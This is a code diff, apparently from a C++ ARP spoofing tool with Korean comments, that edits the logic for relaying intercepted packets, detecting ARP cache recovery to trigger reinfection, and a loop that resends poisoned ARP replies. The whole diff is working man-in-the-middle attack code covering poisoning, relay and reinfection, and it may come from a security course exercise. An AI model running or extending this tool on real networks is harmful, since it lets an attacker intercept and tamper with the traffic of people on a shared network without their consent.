@@ -159,9 +159,6 @@ bool isSpoofed(const u_char *replyPacket, FlowInfo info){
 	EthHdr *eth = (struct EthHdr *)replyPacket;
 	if (eth->type() == EthHdr::Ip4){
 		EthIpPacket *ipPacket = (struct EthIpPacket *)replyPacket;
-		// 원래 나한테 보내려던 패킷 -> relay 필요 없음
-		if (ipPacket->ip_.dip())
-			return false;
 		
 		// Udp의 broadcast -> relay 필요 없음
 		if (ipPacket->ip_.p() == IpHdr::Udp){
@@ -174,8 +171,13 @@ bool isSpoofed(const u_char *replyPacket, FlowInfo info){
 		}
 
 		// sender가 보낸 패킷 -> spoof 됨 -> relay 필요
-		if (ipPacket->ip_.sip() == info.senderIp && ipPacket->eth_.smac() == info.senderMac)
+		if (ipPacket->ip_.sip() == info.senderIp && ipPacket->eth_.smac() == info.senderMac){
+			// // 원래 나한테 보내려던 패킷 -> relay 필요 없음
+			// if (ipPacket->ip_.dip() == info.attackerIp)
+			// 	return false;
+			printf("relay\n");
 			return true;
+		}
 	}
 	return false;
 }
@@ -184,14 +186,19 @@ bool isRecovered(const u_char *replyPacket, FlowInfo info){
 	EthHdr *eth = (struct EthHdr *)replyPacket;
 	if (eth->type() == EthHdr::Arp){
 		EthArpPacket *arpPacket = (struct EthArpPacket *)replyPacket;
-		if (arpPacket->arp_.op() == ArpHdr::Reply){
-			// recover 위해서 broadcast 하는 경우 -> recover 필요
-			if (arpPacket->eth_.dmac() == info.attackerMac)
+		if (arpPacket->arp_.op() == ArpHdr::Request){
+			// // recover 위해서 broadcast 하는 경우 -> recover 필요
+			// if (arpPacket->eth_.dmac() == info.attackerMac)
+			// 	return true;
+			// if (arpPacket->eth_.dmac() == info.targetMac)
+			// 	return true;
+			// if (arpPacket->eth_.dmac() == Mac::broadcastMac())
+			// 	return true;
+			if (arpPacket->arp_.tip() == info.targetIp){
+				printf("reinfect\n");
 				return true;
-			if (arpPacket->eth_.dmac() == info.targetMac)
-				return true;
-			if (arpPacket->eth_.dmac() == Mac::broadcastMac())
-				return true;
+			}
+				
 		}
 	}
 	return false;
@@ -201,6 +208,7 @@ void Infect(pcap_t *handle){
 	while(runThread){
 		for(auto iter : flows){
 			SendArpPacket(handle, iter.infectPkt);
+			printf("infect\n");
 			sleep(1);
 		}
 		sleep(5);
